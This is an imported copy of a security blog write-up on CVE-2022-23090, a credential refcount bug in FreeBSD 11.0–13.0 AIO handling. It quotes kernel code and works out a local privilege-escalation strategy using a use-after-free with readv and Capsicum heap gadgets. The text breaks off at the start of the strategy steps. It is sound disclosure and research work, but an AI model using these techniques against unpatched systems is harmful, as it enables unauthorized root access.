---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-16_freebsd-110-130-lpe-via-aio_aqueue-kernel-refcount-bug.md
original_filename: 2022-08-16_freebsd-110-130-lpe-via-aio_aqueue-kernel-refcount-bug.md
title: FreeBSD 11.0-13.0 LPE via aio_aqueue Kernel Refcount Bug
category: documents
detected_topics:
- access-control
- command-injection
- information-disclosure
- api-security
tags:
- imported
- documents
- access-control
- command-injection
- information-disclosure
- api-security
language: en
raw_sha256: bf4399bc4edab8d0cf72fa55fd1bd883b0f801055434973420adf2918f4dc565
text_sha256: a65ee681752bb98bdd59a7b245882b3a166c098949d707301ca43026234d8ce5
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# FreeBSD 11.0-13.0 LPE via aio_aqueue Kernel Refcount Bug

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-16_freebsd-110-130-lpe-via-aio_aqueue-kernel-refcount-bug.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, information-disclosure, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `bf4399bc4edab8d0cf72fa55fd1bd883b0f801055434973420adf2918f4dc565`
- Text SHA256: `a65ee681752bb98bdd59a7b245882b3a166c098949d707301ca43026234d8ce5`


## Content

---
title: "FreeBSD 11.0-13.0 LPE via aio_aqueue Kernel Refcount Bug"
page_title: "FreeBSD 11.0-13.0 LPE via aio_aqueue Kernel Refcount
Bug - Access Vector"
url: "https://accessvector.net/2022/freebsd-aio-lpe"
final_url: "https://accessvector.net/2022/freebsd-aio-lpe"
authors: ["Chris (@accessvector)"]
programs: ["FreeBSD Security Team"]
bugs: ["Memory corruption", "Local Privilege Escalation"]
publication_date: "2022-08-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2302
---

# FreeBSD 11.0-13.0 LPE via aio_aqueue Kernel Refcount Bug

16th August, 2022 chris

## Introduction

The FreeBSD 13.1 kernel patched a bug in the `aio_aqueue` function, which is used to handle the internals of a few of the asynchronous I/O syscalls (`aio_read`, `aio_write`, `aio_fsync`, etc.).

The bug was patched as a memory leak, but it was in fact more serious: it was a classic refcount bug affecting the calling process’ credential struct (`ucred`). By triggering a certain error path in `aio_aqueue`, a reference would be taken on the credential, but not released in the clean-up. Repeatedly triggering this error path allows the count to wrap, which paves the way for a use-after-free to occur.

![The proof-of-concept privesc exploit in action against FreeBSD 13.0-RELEASE](freebsd-aio-lpe.png) The proof-of-concept privesc exploit in action against FreeBSD 13.0-RELEASE

The vulnerability was present from FreeBSD 11.0 through to FreeBSD 13.0.

This article describes the vulnerability, lays out an LPE exploitation strategy and demonstrates the issue through a proof-of-concept exploit.

I reported the missing backport to the FreeBSD Security Officer Team on the 25th of June, 2022 and it was backported to `stable/12` two days later. The fix was merged into supported `releng/*` branches on the 25th of July, 2022. FreeBSD 11.x will not receive a backport as per the policy for [Supported FreeBSD Releases](https://www.freebsd.org/security/#sup).

CVE-2022-23090 was assigned to the issue and advisory published as [FreeBSD-SA-22:10.aio](https://www.freebsd.org/security/advisories/FreeBSD-SA-22:10.aio.asc).

Thanks to Philip Paeps from the FreeBSD Security Team for responding swiftly and keeping me updated.

## Vulnerability Overview

FreeBSD supports asynchronous I/O (AIO) through a familiar set of POSIX syscalls: `aio_read`, `aio_write`, `aio_fsync`, `lio_listio`, etc. The purpose of these calls is to tell the kernel to queue some I/O operation, but return back to userland immediately.

Submitted jobs can then be queried or canceled through syscalls such as `aio_waitcomplete`, `aio_return` and `aio_cancel`.

When userland submits these AIO jobs, they pass an I/O “control block” in:
  
  
  /*
  * I/O control block
  */
  typedef struct aiocb {
  int aio_fildes;  /* File descriptor */
  off_t  aio_offset;  /* File offset for I/O */
  volatile void *aio_buf;  /* I/O buffer in process space */
  size_t  aio_nbytes;  /* Number of bytes for I/O */
  int __spare__[2];
  void  *__spare2__;
  int aio_lio_opcode;  /* LIO opcode */
  int aio_reqprio;  /* Request priority -- ignored */
  struct  __aiocb_private _aiocb_private;
  struct  sigevent aio_sigevent;  /* Signal to deliver */
  } aiocb_t;

This structure describes which file descriptor to perform the operation on, a pointer to the userland buffer to read/write from/to, the number of bytes, etc.

Although there are a few different syscalls depending on what you’re asking of the kernel, when it comes to queuing the job they all call through to a function call `aio_aqueue`.

For example, when calling the `aio_fsync` syscall, we basically have a direct route into it:
  
  
  static int
  kern_aio_fsync(struct thread *td, int op, struct aiocb *ujob,
  struct aiocb_ops *ops)
  {
  
  if (op != O_SYNC) /* XXX lack of O_DSYNC */
  return (EINVAL);
  return (aio_aqueue(td, ujob, NULL, LIO_SYNC, ops));
  }
  
  int
  sys_aio_fsync(struct thread *td, struct aio_fsync_args *uap)
  {
  
  return (kern_aio_fsync(td, uap->op, uap->aiocbp, &aiocb_ops));
  }

`aio_aqueue`’s job is to copy in the control block, do some validation, resolve some resources (e.g. translate the file descriptor to a `file` struct) and then queue the job to the right place.

For our discussion, here’s the crux of the function with a bunch of code elided for clarity:
  
  
  int
  aio_aqueue(struct thread *td, struct aiocb *ujob, struct aioliojob *lj,
  int type, struct aiocb_ops *ops)
  {
  struct proc *p = td->td_proc;
  struct file *fp;
  struct kaiocb *job;
  struct kaioinfo *ki;
  struct kevent kev;
  int opcode;
  int error;
  int fd, kqfd;
  ...
  [1]  job = uma_zalloc(aiocb_zone, M_WAITOK | M_ZERO);
  ...
  [2]  error = ops->copyin(ujob, &job->uaiocb);
  ...
  fd = job->uaiocb.aio_fildes;
  [3]  switch (opcode) {
  case LIO_WRITE:
  error = fget_write(td, fd, &cap_pwrite_rights, &fp);
  break;
  case LIO_READ:
  error = fget_read(td, fd, &cap_pread_rights, &fp);
  break;
  case LIO_SYNC:
  error = fget(td, fd, &cap_fsync_rights, &fp);
  break;
  case LIO_MLOCK:
  fp = NULL;
  break;
  case LIO_NOP:
  error = fget(td, fd, &cap_no_rights, &fp);
  break;
  default:
  error = EINVAL;
  }
  ...
  ops->store_error(ujob, EINPROGRESS);
  job->uaiocb._aiocb_private.error = EINPROGRESS;
  job->userproc = p;
  [4]  job->cred = crhold(td->td_ucred);
  job->jobflags = KAIOCB_QUEUEING;
  job->lio = lj;
  
  if (opcode == LIO_MLOCK) {
  aio_schedule(job, aio_process_mlock);
  error = 0;
  } else if (fp->f_ops->fo_aio_queue == NULL)
  [5]  error = aio_queue_file(fp, job);
  else
  [6]  error = fo_aio_queue(fp, job);
  if (error)
  goto aqueue_fail;
  ...
  [7] aqueue_fail:
  knlist_delete(&job->klist, curthread, 0);
  if (fp)
  fdrop(fp, td);
  uma_zfree(aiocb_zone, job);
  ops->store_error(ujob, error);
  return (error);
  }

Near the top of the function, an allocation is made for an in-kernel representation of the job [1]. A `copyin` implementation is then used to fetch the userland representation [2] before processing continues.

At [3], the kernel considers the operation that’s been asked and does file descriptor resolution accordingly. For instance, if userland asked for an async write then the kernel needs to be sure that they have the file open for write access – so it uses `fget_write`.

After resolving the `file`, there are a few more things to store on the job including a pointer to the process that asked for the job and the credential of the calling thread [4].

It’s important to store the credential here because the kernel needs to remember the identity of the process at the time the job was queued. As we’re talking about _asynchronous_ I/O, if the kernel resolved the process’ credential at the time the job was performed, the identity may be different (the process may have called `setuid`, for example).

Once the `job` is configured, the kernel passes it onto the next stage for queuing. Some types of file have their own implementation of `fo_aio_queue` [6], but in reality most types just use the default `aio_queue_file` [5] function.

If the queue function fails, control flow jumps to `aqueue_fail` [7] where the `job` is deconstructed, freed and the error returned. Notice that the error path here does not balance the `ucred` refcount taken at [4]; this is the vulnerability.

By triggering this error path, the refcount on the calling thread’s credential will be incremented each time.

How feasible is it to trigger an error in `aio_queue_file` though? It turns out to be straightforward:
  
  
  int
  aio_queue_file(struct file *fp, struct kaiocb *job)
  {
  struct kaioinfo *ki;
  struct kaiocb *job2;
  struct vnode *vp;
  struct mount *mp;
  int error;
  bool safe;
  
  ki = job->userproc->p_aioinfo;
  error = aio_qbio(job->userproc, job);
  if (error >= 0)
  return (error);
  [8]  safe = false;
  if (fp->f_type == DTYPE_VNODE) {
  vp = fp->f_vnode;
  if (vp->v_type == VREG || vp->v_type == VDIR) {
  mp = fp->f_vnode->v_mount;
  if (mp == NULL || (mp->mnt_flag & MNT_LOCAL) != 0)
  [9]  safe = true;
  }
  }
  if (!(safe || enable_aio_unsafe)) {
  counted_warning(&unsafe_warningcnt,
  "is attempting to use unsafe AIO requests");
  [10]  return (EOPNOTSUPP);
  }
  
  ...

If unsafe AIO is disabled (as it is by default) then performing AIO on files is considered unsafe [8] unless the file is a regular file or directory [9]. All other cases will return `EOPNOTSUPP` [10], allowing us to reach the interesting error path.

## Exploitability Analysis

Reference count bugs are not always exploitable. We need to be sure that:

  1. The reference count increment is not checked for an overflow.
  2. It’s feasible to cause the reference to overflow within a reasonable time.
  3. We can leverage the overflow to cause a premature `free`.
  4. We have enough flexibility over the heap to allocate a useful object in its place.
  5. We can do something useful with the reallocation.

Much of this can be answered by considering the `crhold` function:
  
  
  struct ucred *
  crhold(struct ucred *cr)
  {
  
  refcount_acquire(&cr->cr_ref);
  return (cr);
  }

So this is implemented with a simple call to `refcount_acquire` on the `cr_ref` field.
  
  
  static __inline void
  refcount_acquire(volatile u_int *count)
  {
  
  KASSERT(*count < UINT_MAX, ("refcount %p overflowed", count));
  atomic_add_int(count, 1);
  }

With `KASSERT` enabled, this overflow will get caught, but this is not enabled for standard RELEASE kernels. Point 1 on our list is satisfied.

`cr_ref` is a `u_int`:
  
  
  struct ucred {
  u_int  cr_ref;  /* reference count */
  #define cr_startcopy cr_uid
  uid_t  cr_uid;  /* effective user id */
  uid_t  cr_ruid;  /* real user id */
  uid_t  cr_svuid;  /* saved user id */
  int  cr_ngroups;  /* number of groups */
  gid_t  cr_rgid;  /* real group id */
  gid_t  cr_svgid;  /* saved group id */
  struct uidinfo  *cr_uidinfo;  /* per euid resource consumption */
  struct uidinfo  *cr_ruidinfo;  /* per ruid resource consumption */
  struct prison  *cr_prison;  /* jail(2) */
  struct loginclass  *cr_loginclass; /* login class */
  u_int  cr_flags;  /* credential flags */
  void  *cr_pspare2[2]; /* general use 2 */
  #define cr_endcopy  cr_label
  struct label  *cr_label;  /* MAC label */
  struct auditinfo_addr  cr_audit;  /* Audit properties. */
  gid_t  *cr_groups;  /* groups */
  int  cr_agroups;  /* Available groups */
  gid_t  cr_smallgroups[XU_NGROUPS];  /* storage for small groups */
  };

`u_int`s are 32 bits on the platforms that we probably care about (i386, amd64). That means that it’s certainly feasible to wrap the refcount in a reasonable amount of time. Point 2 on our list is satisfied.

Next we need to consider how to use this refcount wrap to cause a premature free. This isn’t always as simple as it sounds, but whatever our approach, we need to have a controlled way of calling the refcount decrement path. In our case, we need to find a route to call `crfree`:
  
  
  void
  crfree(struct ucred *cr)
  {
  
  KASSERT(cr->cr_ref > 0, ("bad ucred refcount: %d", cr->cr_ref));
  KASSERT(cr->cr_ref != 0xdeadc0de, ("dangling reference to ucred"));
  [1]  if (refcount_release(&cr->cr_ref)) {
  /*
  * Some callers of crget(), such as nfs_statfs(),
  * allocate a temporary credential, but don't
  * allocate a uidinfo structure.
  */
  if (cr->cr_uidinfo != NULL)
  uifree(cr->cr_uidinfo);
  if (cr->cr_ruidinfo != NULL)
  uifree(cr->cr_ruidinfo);
  /*
  * Free a prison, if any.
  */
  if (cr->cr_prison != NULL)
  prison_free(cr->cr_prison);
  if (cr->cr_loginclass != NULL)
  loginclass_free(cr->cr_loginclass);
  #ifdef AUDIT
  audit_cred_destroy(cr);
  #endif
  #ifdef MAC
  mac_cred_destroy(cr);
  #endif
  if (cr->cr_groups != cr->cr_smallgroups)
  free(cr->cr_groups, M_CRED);
  [2]  free(cr, M_CRED);
  }
  }

Once the `refcount_release` returns true at [1], we enter the branch that allows the credential itself to be freed [2].

How can we reliably have `crfree` called on our target `ucred`?

The AIO syscalls can help us here. Rather than thinking about the vulnerable error path, consider what happens in a success path: the thread’s `ucred` is held with `crhold` and attached to the job. The job is then queued for processing, but it doesn’t live forever: it has a legitimate cleanup function called `aio_free_entry` that does the `crfree`:
  
  
  static int
  aio_free_entry(struct kaiocb *job)
  {
  ...
  crfree(job->cred);
  uma_zfree(aiocb_zone, job);
  AIO_LOCK(ki);
  
  return (0);
  }

We can reach `aio_free_entry` through either the `aio_waitcomplete` syscall or the `aio_return` syscall. `aio_waitcomplete` will wait for an in-flight AIO job to complete (either any job or a specific one depending on how it’s called) while `aio_return` will collect the result of a specific AIO job if it’s complete.

`aio_waitcomplete` feels the easiest route to me. It’ll wait for the job to be processed and then only return back to userland once `aio_free_entry` (and therefore `crfree`) has been called on the attached `ucred`.

The next question is: how do we know when we’ve dropped the last reference to the credential using this technique? We have the ability to skew the refcount using the vulnerability, but we need to know for sure when we’ve dropped the last reference so that we can target the free hole with a heap allocation gadget.

There are two general approaches to achieving this:

  1. Find a method that allows us to “test” if the object we’re affecting has been freed. After each call to `crfree`, use the oracle to tell us if we’ve hit the condition.
  2. Find some way of knowing what the current reference count on the credential is.

Option 1 is generic, but can be time-consuming and error-prone: we need to iteratively trigger the vulnerability, trigger a `crfree` and then probe and test.

Option 2 is surprisingly easy for credentials because of the way the `sys_setuid` syscall is implemented in FreeBSD:
  
  
  int
  sys_setuid(struct thread *td, struct setuid_args *uap)
  {
  struct proc *p = td->td_proc;
  struct ucred *newcred, *oldcred;
  uid_t uid;
  struct uidinfo *uip;
  int error;
  
  uid = uap->uid;
  AUDIT_ARG_UID(uid);
  [3]  newcred = crget();
  ...
  oldcred = crcopysafe(p, newcred);
  ...
  [4]  if (uid != oldcred->cr_ruid &&  /* allow setuid(getuid()) */
  #ifdef _POSIX_SAVED_IDS
  uid != oldcred->cr_svuid &&  /* allow setuid(saved gid) */
  #endif
  #ifdef POSIX_APPENDIX_B_4_2_2  /* Use BSD-compat clause from B.4.2.2 */
  uid != oldcred->cr_uid &&  /* allow setuid(geteuid()) */
  #endif
  (error = priv_check_cred(oldcred, PRIV_CRED_SETUID, 0)) != 0)
  goto fail;
  ...
  [5]  proc_set_cred(p, newcred);
  ...
  crfree(oldcred);
  return (0);
  ...
  }

`sys_setuid` always allocates a new credential [3]. The only failure path through the syscall is if we’re trying to change our identity [4]; so long as we’re not trying to do that, the call goes ahead and applies the newly-created credential to our process [5].

That means that this is entirely allowed as an unprivileged user:
  
  
  setuid(getuid());

After which we’ll end up with a credential on our process with a known refcount value: 2 (one for the `struct proc`, one for the `struct thread`).

Once the value is known, we can use the refcount wrap to decrement it to a known value and then trigger the `crfree` through `aio_waitcomplete`.

This is point 3 in our list of exploitability criteria covered nicely.

Once we’ve freed our process’ credential, we need to be able to control a heap allocation in its place. To do that, we need at least a high level understanding of how the heap behaves.

The FreeBSD kernel uses a zone allocator for the heap. Built upon the zone allocator is the general purpose heap, which employs the classic approach of creating several generic zones to service allocation requests of 2^n-byte sizes. Much of this is common knowledge, so I won’t spend long discussing it.

For our situation, it’s important to note that we’re left with different options depending on whether our victim object is allocated from a specialised zone or the general purpose heap:

  * For a specialised zone, we can generally only allocate objects of the same type back into a freed slot. This is because pages for specialised zones are only carved up to hold homogeneous objects by type. (Some kernels are vulnerable to “cross-zone page reuse attacks” that allow this to be circumvented by applying memory pressure to the page allocator. This then causes virtual memory to be reused in a different specialised zone, giving us more options to control memory in the use-after-free.)
  * For victims on the general purpose heap, our life is generally much simpler. As long as we can find a way of allocating an object of approximately the same size as our victim object, and populate that with controlled contents, we’re in a good place to make progress.

The difference can be put simply that specialised zones group by type, whereas general purpose zones group by size. We have many more options to allocate controlled data into a slot when grouping by size.

A final point about the kernel heap: it operates on a last-in, first-out (LIFO) basis. The last virtual address we free to a zone will be the next virtual address to be handed out by it. (This is complicated slightly by per-CPU caching on SMP systems, but by pinning our execution to a single CPU via `cpuset_setaffinity` we can avoid the issue.)

Back to the point: we already saw in `crfree` that the general purpose heap is used for credentials (indicated by the use of `free` at [2]). This is a good sign that exploiting the use-after-free will be very simple provided we can find a useful gadget for allocating the right size chunk on the heap and fill it with controlled data. It turns out that we have an excellent tool at our disposal for this in FreeBSD, which we will come to shortly.

And so point 4 on our list is covered: we are confident that we can control the use-after-free.

Finally, for point 5 we must consider how to use this use-after-free to our advantage. In our case, we appear to be spoilt: the structure that’s subject to a use-after-free in our case is directly security related. Exploiting it isn’t quite as simple as it first seems, but it’s still not difficult. We’ll explore this nuance next.

## Initial Thoughts on Exploitation Strategy

The vulnerability gives us the ability to free a `ucred`, which is allocated from the general purpose heap, while it’s still in use. The obvious thing we should try here is to fill the hole with a fake `ucred` by using some gadget that allows us to perform a kernel heap allocation (we’ll look at this more in the next section).

Once we have a fake credential in place, we can make the kernel forge a real one from it using the `setuid(getuid())` trick – it’ll see the elevated uid/gid/etc. and use that when copying into a freshly-allocated `ucred`.

In practice, this leads to `NULL` pointer dereferences. Let’s remind ourselves of the `ucred` structure:
  
  
  struct ucred {
  u_int  cr_ref;  /* reference count */
  #define cr_startcopy cr_uid
  uid_t  cr_uid;  /* effective user id */
  uid_t  cr_ruid;  /* real user id */
  uid_t  cr_svuid;  /* saved user id */
  int cr_ngroups;  /* number of groups */
  gid_t  cr_rgid;  /* real group id */
  gid_t  cr_svgid;  /* saved group id */
  struct uidinfo  *cr_uidinfo;  /* per euid resource consumption */
  struct uidinfo  *cr_ruidinfo;  /* per ruid resource consumption */
  struct prison  *cr_prison; /* jail(2) */
  struct loginclass  *cr_loginclass; /* login class */
  u_int  cr_flags;  /* credential flags */
  void  *cr_pspare2[2]; /* general use 2 */
  #define cr_endcopy  cr_label
  struct label  *cr_label;  /* MAC label */
  struct auditinfo_addr  cr_audit;  /* Audit properties. */
  gid_t  *cr_groups;  /* groups */
  int cr_agroups;  /* Available groups */
  gid_t  cr_smallgroups[XU_NGROUPS]; /* storage for small groups */
  };

There are a few pointers in there. Without an information disclosure vulnerability first, we’re not necessarily going to be able to provide good values here when we place our fake `ucred` in the hole we make. On the one hand, FreeBSD doesn’t have KASLR, so we _could_ hardcode some pointers that allow us to just about get by… but that’s ugly. We’d be tying our exploit to specific versions and architectures and we should strive to do better.

Maybe with some luck we’ll be able to avoid paths in our strategy that dereference those pointers. The only values we can give for them without prior knowledge is `NULL`, so let’s see how far that gets us.

We need to begin with `crcopysafe`, which is the necessary function to call for our strategy to work out:
  
  
  struct ucred *
  crcopysafe(struct proc *p, struct ucred *cr)
  {
  struct ucred *oldcred;
  int groups;
  
  PROC_LOCK_ASSERT(p, MA_OWNED);
  
  oldcred = p->p_ucred;
  [1]  while (cr->cr_agroups < oldcred->cr_agroups) {
  groups = oldcred->cr_agroups;
  PROC_UNLOCK(p);
  crextend(cr, groups);
  PROC_LOCK(p);
  oldcred = p->p_ucred;
  }
  [2]  crcopy(cr, oldcred);
  
  return (oldcred);
  }

So far this looks okay. What’s happening is that the kernel is trying to ensure it has enough capacity in the `cr_groups` pointer of the new credential to hold the number of groups in the old credential (i.e. our fake one) [1]. Once it’s happy, it calls on to `crcopy` [2]:
  
  
  void
  crcopy(struct ucred *dest, struct ucred *src)
  {
  
  KASSERT(dest->cr_ref == 1, ("crcopy of shared ucred"));
  [3]  bcopy(&src->cr_startcopy, &dest->cr_startcopy,
  (unsigned)((caddr_t)&src->cr_endcopy -
  (caddr_t)&src->cr_startcopy));
  [4]  crsetgroups(dest, src->cr_ngroups, src->cr_groups);
  [5]  uihold(dest->cr_uidinfo);
  [6]  uihold(dest->cr_ruidinfo);
  [7]  prison_hold(dest->cr_prison);
  [8]  loginclass_hold(dest->cr_loginclass);
  #ifdef AUDIT
  audit_cred_copy(src, dest);
  #endif
  #ifdef MAC
  mac_cred_copy(src, dest);
  #endif
  }

Coming into this function, `src` points to our fake `ucred` where we’ve presumably set all of the fields we want and `dest` is the new `ucred` that the kernel is constructing based on the values.

It begins by copying a bunch of fields verbatim [3]. Referring to the `struct`, we can see that this includes a bunch of pointers: `cr_uidinfo`, `cr_ruidinfo`, `cr_prison` and `cr_loginclass`. After copying the pointers, the kernel then goes on to:

  1. Copy across the groups [4], which should be safe in terms of capacity because of what `crcopysafe` did.
  2. Take a reference to `cr_uidinfo` [5].
  3. Take a reference to `cr_ruidinfo` [6].
  4. Take a reference to `cr_prison` [7].
  5. Take a reference to `cr_loginclass` [8].

Now we’re in the danger zone. If any of those functions cannot handle a `NULL` pointer then we’re out of luck.

You only need to look as far as `uihold` to discover our fate:
  
  
  void
  uihold(struct uidinfo *uip)
  {
  
  refcount_acquire(&uip->ui_ref);
  }

Sadly, it looks like if we want to use this strategy then we need to shore up some legit pointers for the kernel to suck on.

We may still be able to go half way though, so let’s consider that.

## Using a Partial Free Overwrite

We can try a different approach to our problem. Recall that the position we’re in is that our `proc` has a dangling `ucred` pointer. The memory that it points to actually still looks just like a `ucred` since the FreeBSD kernel doesn’t zero-on-free.

What we can do is use some kernel function that does a `malloc` of the right size, then cause the `copyin` to fail part-way through. Crucially, the call to `malloc` must not specify the `M_ZERO` flag, else the whole chunk will be zeroed before the `copyin`.

Typically, making the `copyin` fail strategically is done by passing the kernel a pointer near to the end of a mapped page such that some of the data is mapped-in (and so succeeds), but the rest crosses into unmapped memory. When this happens, the kernel will fail gracefully and return an error back to userland – but the bytes that did succeed in copying would have made it in.

By using this technique, we can overwrite the first part of the stale `ucred` with custom data, but leave the rest (i.e. the pointers) all in tact. We then need to be careful to make sure the hole doesn’t get filled before our `setuid(getuid())` call has a chance to copy the data out of it.

There are a few ways to achieve these partial `copyin`s and I’m sure everyone has their favourite. A classic one is vectored I/O.

## Controlling a Partial Kernel Allocation with Vectored I/O Syscalls

A quick search with [weggli](https://github.com/googleprojectzero/weggli) shows some interesting candidates even just under `kern` (so we exclude exotic codepaths):
  
  
  $ weggli -C '{ malloc(_($c)); copyin($a, $b, _($c)); }' kern
  ...
  /Users/chris/src/freebsd/releng/12.3/sys/kern/subr_uio.c:404
  int
  copyinuio(const struct iovec *iovp, u_int iovcnt, struct uio **uiop)
  ..
  if (iovcnt > UIO_MAXIOV)
  return (EINVAL);
  [1]  iovlen = iovcnt * sizeof (struct iovec);
  [2]  uio = malloc(iovlen + sizeof *uio, M_IOV, M_WAITOK);
  iov = (struct iovec *)(uio + 1);
  [3]  error = copyin(iovp, iov, iovlen);
  if (error) {
  free(uio, M_IOV);
  return (error);
  }
  uio->uio_iov = iov;
  ..
  }
  ...

`copyinuio` is a utility function used by a bunch of syscalls that deal with vectored I/O. The kernel calculates a length [1] based on the number of `iovec`s required, does a `malloc` [2] and uses `copyin` [3]. If there’s an error, it `free`s the buffer and returns it.

This is precisely what we’re looking for; especially since the `malloc` call does not specify `M_ZERO`. So how can we reach it?

Very easily, it turns out: pick basically any vectored I/O syscall. One of them is `readv`:
  
  
  int
  sys_readv(struct thread *td, struct readv_args *uap)
  {
  struct uio *auio;
  int error;
  
  [4]  error = copyinuio(uap->iovp, uap->iovcnt, &auio);
  if (error)
  return (error);
  error = kern_readv(td, uap->fd, auio);
  free(auio, M_IOV);
  return (error);
  }

It’s basically a direct route to exercising this perfect function from userland [4].

So using `readv` lets us craft the freed hole into a root credential. We can then use our dangling pointer to construct a new `ucred` from that.

## Changing Strategy

I’ll be honest, I didn’t actually work much on getting the partial overwrite approach going. I’ve used it before in other contexts, so it’s a fine method when you absolutely need it, but it occurred to me that we can do something else without having to worry about the `ucred` hole getting inadvertently filled.

`crcopysafe` isn’t the only thing we can do with a `ucred`. It’s the obvious thing, for sure, but let’s consider what would happen if we tried to have `crfree` called on our fake credential:
  
  
  void
  crfree(struct ucred *cr)
  {
  
  KASSERT(cr->cr_ref > 0, ("bad ucred refcount: %d", cr->cr_ref));
  KASSERT(cr->cr_ref != 0xdeadc0de, ("dangling reference to ucred"));
  [1]  if (refcount_release(&cr->cr_ref)) {
  /*
  * Some callers of crget(), such as nfs_statfs(),
  * allocate a temporary credential, but don't
  * allocate a uidinfo structure.
  */
  [2]  if (cr->cr_uidinfo != NULL)
  uifree(cr->cr_uidinfo);
  [3]  if (cr->cr_ruidinfo != NULL)
  uifree(cr->cr_ruidinfo);
  /*
  * Free a prison, if any.
  */
  [4]  if (cr->cr_prison != NULL)
  prison_free(cr->cr_prison);
  [5]  if (cr->cr_loginclass != NULL)
  loginclass_free(cr->cr_loginclass);
  #ifdef AUDIT
  audit_cred_destroy(cr);
  #endif
  #ifdef MAC
  mac_cred_destroy(cr);
  #endif
  if (cr->cr_groups != cr->cr_smallgroups)
  [6]  free(cr->cr_groups, M_CRED);
  [7]  free(cr, M_CRED);
  }
  }

This function is much more friendly with `NULL` pointers. If we place a fake `ucred` with a `cr_ref` of 1, then have `crfree` called on it, we’ll trigger the clean-up logic [1].

All of the pointers that seemed to be a problem before ([2], [3], [4], [5]) are now okay to be `NULL`. Even `cr_groups` is okay because it’s perfectly valid to pass `NULL` to `free` [6].

What would happen now is that our fake `ucred` would be freed at [7]. Whether this is useful or not depends on what we’re relying on to allocate that fake `ucred`. Imagine there’s some mechanism in the kernel that allows us to allocate and fill a buffer of our choosing on the heap while also allowing us to read back the content of the buffer and free it whenever we like.

If we could find something like that, then we’d be able to:

  1. Create the `ucred` hole.
  2. Fill it with content of our choosing, arranging for `cr_ref` to be 1 and all pointers to be `NULL`. This is our fake `ucred`.
  3. Cause `crfree` to be called on that fake `ucred`. This re-creates the hole.
  4. Allocate a new, legitimate `ucred`. This fills the hole again due to LIFO.
  5. Read back the content of that buffer using the allocation mechanism. This now gives us the valid kernel pointers we want.
  6. Free the buffer (and consequently the legitimate `ucred`) using the mechanism.
  7. Reallocate back into the hole using a fixed-up version of the `ucred` we read.

But surely such a useful mechanism doesn’t exist? Well, have I got news for you. :)

## Controlling Kernel Allocations with Capsicum

One of the interesting syscalls I came across when looking for an allocation gadget is `cap_ioctls_limit`. This syscall allows us to attach an allowlist of `ioctl` commands for any open file.

The prototypes for the syscall and its friend, `cap_ioctls_get`, are:
  
  
  int cap_ioctls_limit(int fd, const cap_ioctl_t *cmds, size_t ncmds);
  ssize_t cap_ioctls_get(int fd, cap_ioctl_t *cmds, size_t maxcmds);

`cap_ioctl_t` is just `unsigned long`.

Let’s see how this is implemented:
  
  
  int
  sys_cap_ioctls_limit(struct thread *td, struct cap_ioctls_limit_args *uap)
  {
  u_long *cmds;
  size_t ncmds;
  int error;
  
  ncmds = uap->ncmds;
  
  if (ncmds > IOCTLS_MAX_COUNT)
  return (EINVAL);
  
  if (ncmds == 0) {
  cmds = NULL;
  } else {
  [1]  cmds = malloc(sizeof(cmds[0]) * ncmds, M_FILECAPS, M_WAITOK);
  [2]  error = copyin(uap->cmds, cmds, sizeof(cmds[0]) * ncmds);
  if (error != 0) {
  free(cmds, M_FILECAPS);
  return (error);
  }
  }
  
  [3]  return (kern_cap_ioctls_limit(td, uap->fd, cmds, ncmds));
  }

This is already looking promising. Provided we didn’t ask for too much (`IOCTLS_MAX_COUNT` is 256), the kernel is going to do a general purpose allocation of a size under our control [1] and entirely fill it with the data we provide [2].

Since `ioctl_cmd_t` is `unsigned long`, that means we can allocate up to `256 * sizeof(unsigned long)` bytes here and fill it with custom content.

We still need to understand what happens next in `kern_cap_ioctls_limit` [3] though:
  
  
  int
  kern_cap_ioctls_limit(struct thread *td, int fd, u_long *cmds, size_t ncmds)
  {
  struct filedesc *fdp;
  struct filedescent *fdep;
  u_long *ocmds;
  int error;
  ...
  [4]  error = cap_ioctl_limit_check(fdep, cmds, ncmds);
  if (error != 0)
  goto out;
  
  [5]  ocmds = fdep->fde_ioctls;
  seqc_write_begin(&fdep->fde_seqc);
  [6]  fdep->fde_ioctls = cmds;
  fdep->fde_nioctls = ncmds;
  seqc_write_end(&fdep->fde_seqc);
  
  [7]  cmds = ocmds;
  ...
  [8]  free(cmds, M_FILECAPS);
  return (error);
  }

Some validation is firstly performed using `cap_ioctl_limit_check` [4]. We need to understand that (shortly) because it could stand in our way.

Next we save a pointer to any previously-configured `ioctl` allowlist [5] before setting the new one [6]. The old one is then freed through [7] and [8]. (If there was none set then this is safe; `free(NULL);` is legal.)

Things are looking good for using this as an arbitrary kernel allocation gadget: provided `cap_ioctl_limit_check` doesn’t stand in our way, it means we have a way of allocating a general purpose buffer with a good degree of control over the size and fill it with arbitrary data. Further, since the buffer is stashed on the file descriptor we provide, we have a good degree of control over the lifetime of the buffer: it will get freed when the file is closed or when we try to set a zero-length `ioctl` allowlist afterwards (look at the code and you’ll see this is true).

`cap_ioctl_limit_check` is:
  
  
  static int
  cap_ioctl_limit_check(struct filedescent *fdep, const u_long *cmds,
  size_t ncmds)
  {
  u_long *ocmds;
  ssize_t oncmds;
  u_long i;
  long j;
  
  oncmds = fdep->fde_nioctls;
  if (oncmds == -1)
  return (0);
  if (oncmds < (ssize_t)ncmds)
  return (ENOTCAPABLE);
  
  ocmds = fdep->fde_ioctls;
  for (i = 0; i < ncmds; i++) {
  for (j = 0; j < oncmds; j++) {
  if (cmds[i] == ocmds[j])
  break;
  }
  if (j == oncmds)
  return (ENOTCAPABLE);
  }
  
  return (0);
  }

What this function does is check that the new allowlist is a subset of any previously-set allowlist. If this is the first allowlist being set (`->fde_nioctls == -1`) then we exit early with a `return 0;`.

The other syscall, `cap_ioctls_get`, allows userland to read this buffer back. Together, we have everything we need for the wish-list at the end of the previous section:

  1. We can allocate and fill arbitrary general purpose heap buffers with `cap_ioctls_limit`.
  2. We can read back the contents with `cap_ioctls_get`.
  3. We can free the buffer by passing a zero-length buffer to `cap_ioctls_limit` for the same file descriptor.

With this identified, let’s look closer at using it for our purposes.

## Exploitation Strategy

Let’s walk through our new strategy using Capsicum for the arbitrary allocation and this time using our dangling `ucred` pointer to free the `ioctl` allowlist as part of the process:

  1. Get a fresh credential with `setuid(getuid());` so we know `cr_ref`:

  
  
